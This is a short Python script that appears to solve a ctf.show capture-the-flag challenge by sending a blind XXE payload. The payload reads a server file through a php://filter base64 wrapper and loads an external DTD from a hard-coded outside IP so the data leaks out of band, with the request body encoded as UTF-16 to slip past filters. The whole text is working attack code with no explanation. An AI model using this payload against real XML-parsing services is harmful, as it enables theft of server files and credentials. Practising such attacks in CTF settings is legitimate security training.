import requests

url = 'http://7174140f-1d46-432b-bc02-132d0f78b032.challenge.ctf.show/'
data = '''<!DOCTYPE ANY [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://43.139.42.28/eval.dtd">
%aaa;
]>
<root>1</root>'''
r = requests.post(url=url, data=data.encode('utf-16'))
